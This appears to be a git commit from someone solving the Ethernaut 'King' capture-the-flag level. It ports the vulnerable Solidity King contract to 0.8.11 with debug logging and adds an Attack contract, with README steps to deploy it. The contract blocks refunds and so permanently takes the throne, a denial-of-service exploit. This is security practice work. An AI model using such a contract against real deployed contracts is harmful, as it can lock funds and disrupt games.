796438774c769e512ed5920ed12fa8340124070a
karmabadger <karmabadger@outlook.com>
2022-02-15 14:29:57 -0500

    9-king finished

--- levels/9-king/King.sol
+++ levels/9-king/King.sol
@@ -1,5 +1,7 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.11;
+
+import "hardhat/console.sol";
 
 contract King {
 
@@ -7,20 +9,49 @@ contract King {
   uint public prize;
   address payable public owner;
 
-  constructor() public payable {
-    owner = msg.sender;  
-    king = msg.sender;
+  constructor() payable {
+    owner = payable(msg.sender);  
+    king = payable(msg.sender);
     prize = msg.value;
   }
 
   receive() external payable {
+    console.log("received", msg.value, msg.value >= prize, msg.sender == owner);
     require(msg.value >= prize || msg.sender == owner);
+    console.log("h1");
     king.transfer(msg.value);
-    king = msg.sender;
+    console.log("h2");
+    king = payable(msg.sender);
+    console.log("h3");
     prize = msg.value;
+    console.log("h4");
   }
 
-  function _king() public view returns (address payable) {
+  fallback() external payable {
+    console.log("fallback");
+  }
+
+  function stealKing() external payable {
+    console.log("received", msg.value, msg.value >= prize, msg.sender == owner);
+    require(msg.value >= prize || msg.sender == owner);
+    console.log("h1");
+    king.transfer(msg.value);
+    console.log("h2");
+    king = payable(msg.sender);
+    console.log("h3");
+    prize = msg.value;
+    console.log("h4");
+  }
+
+  function _king() external view returns (address payable) {
     return king;
   }
+}
+
+contract Attack {
+    function attack(King _kingContract) public payable {
+      // _kingContract.stealKing();
+      (bool sent, bytes memory data) = payable(_kingContract).call{value: msg.value}("");
+      console.log("attack", address( _kingContract), sent, string(data));
+    }
 }
--- levels/9-king/README.md
+++ levels/9-king/README.md
@@ -1,1 +1,12 @@
-#
+# King
+
+### upgrated to solidity v0.8.11
+
+## instructions
+
+1. deploy King contract (using the original king address)
+2. deploy Attack contract
+3. call attack with King contract address
+
+note:
+attack is using `payable(_kingContract).call{value: msg.value}("")` bc send and transfer do not work.
